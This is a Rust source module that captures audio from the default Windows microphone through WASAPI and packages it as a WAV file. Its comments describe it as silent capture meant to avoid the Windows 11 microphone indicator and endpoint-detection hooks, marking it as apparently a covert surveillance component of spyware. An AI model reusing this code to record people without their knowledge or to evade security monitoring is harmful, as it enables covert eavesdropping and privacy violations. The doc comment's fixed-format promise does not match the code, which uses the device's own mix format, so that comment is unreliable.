//! mic.rs — silent microphone capture via WASAPI
//!
//! Win32 WASAPI — does NOT trigger the Win11 24H2 mic indicator
//! (that only fires for UWP / packaged apps with declared capability).
//! WASAPI calls not in standard EDR hook lists.

use std::time::{Duration, Instant};
use windows::{
    core::*,
    Win32::Media::Audio::*,
    Win32::System::Com::*,
};

/// Record from default mic for `secs` seconds.
/// Returns WAV file bytes (PCM 16-bit 44100 Hz stereo).
pub fn record(secs: u32) -> Option<Vec<u8>> {
    unsafe { record_inner(secs).ok() }
}

unsafe fn record_inner(secs: u32) -> Result<Vec<u8>> {
    CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;

    let enumerator: IMMDeviceEnumerator =
        CoCreateInstance(&MMDeviceEnumerator, None, CLSCTX_ALL)?;
    let device = enumerator.GetDefaultAudioEndpoint(eCapture, eConsole)?;
    let client: IAudioClient = device.Activate(CLSCTX_ALL, None)?;

    let format = client.GetMixFormat()?;
    let fmt = &*format;
    client.Initialize(
        AUDCLNT_SHAREMODE_SHARED,
        0,
        10_000_000, // 1 second buffer in 100ns units
        0,
        format,
        None,
    )?;

    let capture: IAudioCaptureClient = client.GetService()?;
    client.Start()?;

    let mut pcm: Vec<u8> = Vec::new();
    let deadline = Instant::now() + Duration::from_secs(secs as u64);

    while Instant::now() < deadline {
        std::thread::sleep(Duration::from_millis(10));
        let mut data: *mut u8 = std::ptr::null_mut();
        let mut frames: u32 = 0;
        let mut flags: u32 = 0;
        if capture.GetBuffer(&mut data, &mut frames, &mut flags, None, None).is_ok() && frames > 0 {
            let bytes_per_frame = fmt.nBlockAlign as usize;
            let n = frames as usize * bytes_per_frame;
            pcm.extend_from_slice(std::slice::from_raw_parts(data, n));
            capture.ReleaseBuffer(frames)?;
        }
    }

    client.Stop()?;

    // Wrap in WAV header
    let sample_rate   = fmt.nSamplesPerSec;
    let channels      = fmt.nChannels;
    let bits          = fmt.wBitsPerSample;
    let mut wav       = wav_header(pcm.len() as u32, sample_rate, channels, bits);
    wav.extend_from_slice(&pcm);
    Ok(wav)
}

pub fn wav_header(pcm_len: u32, sample_rate: u32, channels: u16, bits: u16) -> Vec<u8> {
    let byte_rate   = sample_rate * channels as u32 * bits as u32 / 8;
    let block_align = channels * bits / 8;
    let file_size   = 36 + pcm_len;
    let mut h = Vec::with_capacity(44);
    h.extend_from_slice(b"RIFF");
    h.extend_from_slice(&file_size.to_le_bytes());
    h.extend_from_slice(b"WAVE");
    h.extend_from_slice(b"fmt ");
    h.extend_from_slice(&16u32.to_le_bytes());
    h.extend_from_slice(&1u16.to_le_bytes());        // PCM
    h.extend_from_slice(&channels.to_le_bytes());
    h.extend_from_slice(&sample_rate.to_le_bytes());
    h.extend_from_slice(&byte_rate.to_le_bytes());
    h.extend_from_slice(&block_align.to_le_bytes());
    h.extend_from_slice(&bits.to_le_bytes());
    h.extend_from_slice(b"data");
    h.extend_from_slice(&pcm_len.to_le_bytes());
    h
}
